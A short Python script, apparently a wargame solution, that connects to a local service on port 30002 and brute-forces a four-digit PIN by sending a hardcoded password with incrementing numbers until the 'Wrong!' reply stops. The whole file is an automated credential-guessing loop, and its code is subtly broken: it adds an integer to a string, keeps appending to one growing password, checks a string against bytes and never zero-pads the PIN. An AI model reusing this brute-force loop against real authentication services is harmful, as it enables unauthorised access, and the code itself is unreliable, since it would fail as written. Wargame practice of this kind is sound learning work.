#!/usr/bin/env python3
# coding: utf-8

import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('localhost',30002))
                           
data = s.recv(1024)       
print(data.decode())      
password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '
r = 'Wrong!'    
pincode = 0          
while True:               
          
    pin_code = str(pincode)
    password += pincode   
    password += '\n'      
    print(password)       
    s.sendall(password.encode())
    data = s.recv(1024)   
    if r in data:         
        print("Wrong !")  
    else:                 
        print(data)       
        break             
    pincode = pincode + 1                                                   
~                              